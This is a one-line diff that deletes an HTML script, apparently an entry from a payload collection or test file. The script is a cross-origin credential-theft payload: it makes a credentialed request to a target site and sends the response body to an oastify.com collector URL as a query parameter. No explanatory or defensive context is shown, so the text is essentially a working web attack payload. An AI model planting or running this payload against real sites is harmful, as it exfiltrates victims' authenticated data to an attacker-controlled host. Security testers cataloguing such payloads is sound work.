@@ -1,1 +1,0 @@
-<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://www.penetration-testing.com/',true); req.withCredentials = true; req.send('{}'); function reqListener() { location = 'https://r48au2kkh9zuuqigy4fypvjab62ct0wol.oastify.com/log?key='+this.responseText; };</script>
